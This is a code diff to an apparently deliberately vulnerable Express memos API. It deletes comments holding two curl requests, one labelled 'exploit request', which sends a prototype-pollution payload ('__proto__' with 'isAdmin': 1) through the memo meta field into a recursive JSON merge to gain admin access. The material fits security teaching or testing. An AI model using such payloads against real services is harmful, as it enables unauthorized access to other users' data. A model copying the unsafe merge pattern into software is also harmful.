@@ -10,7 +10,6 @@ memosRouter.get("/memos", (req, res) => {
 
   let memosList = [];
   if (res.locals.user.isAdmin) {
-    // get memos for all users:
     memosList = db
       .prepare(
         `SELECT memos.id, memos.text, memos.meta, memos.date, user_profile.full_name, user_profile.user_id
@@ -79,39 +78,3 @@ function recursiveJSONMerge(target, source) {
   }
   return target;
 }
-
-// ## ok request
-// curl 'http://localhost:3000/api/memos' \
-//   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
-//   -H 'Connection: keep-alive' \
-//   -H 'Cookie: auth_session=lkf5ewcyzhvkwyjmujaxsvtcsocnonco2o5ztdx5' \
-//   -H 'Origin: http://localhost:3000' \
-//   -H 'Referer: http://localhost:3000/memos' \
-//   -H 'Sec-Fetch-Dest: empty' \
-//   -H 'Sec-Fetch-Mode: cors' \
-//   -H 'Sec-Fetch-Site: same-origin' \
-//   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
-//   -H 'accept: application/json' \
-//   -H 'content-type: application/json' \
-//   -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
-//   -H 'sec-ch-ua-mobile: ?0' \
-//   -H 'sec-ch-ua-platform: "macOS"' \
-//   --data-raw '{"text":"ok ok ok ","meta":"{\"phone\":\"1234\",\"urgency\":\"high\"}"}'
-
-// ## exploit request
-// curl 'http://localhost:3000/api/memos' \
-//   -H 'Accept-Language: en-US,en;q=0.9,he;q=0.8' \
-//   -H 'Connection: keep-alive' \
-//   -H 'Cookie: auth_session=lkf5ewcyzhvkwyjmujaxsvtcsocnonco2o5ztdx5' \
-//   -H 'Origin: http://localhost:3000' \
-//   -H 'Referer: http://localhost:3000/memos' \
-//   -H 'Sec-Fetch-Dest: empty' \
-//   -H 'Sec-Fetch-Mode: cors' \
-//   -H 'Sec-Fetch-Site: same-origin' \
-//   -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36' \
-//   -H 'accept: application/json' \
-//   -H 'content-type: application/json' \
-//   -H 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"' \
-//   -H 'sec-ch-ua-mobile: ?0' \
-//   -H 'sec-ch-ua-platform: "macOS"' \
-//   --data-raw '{"text":"ok ok ok ","meta":"{\"__proto__\": {\"isAdmin\": 1}, \"phone\":\"1234\",\"urgency\":\"high\"}"}'
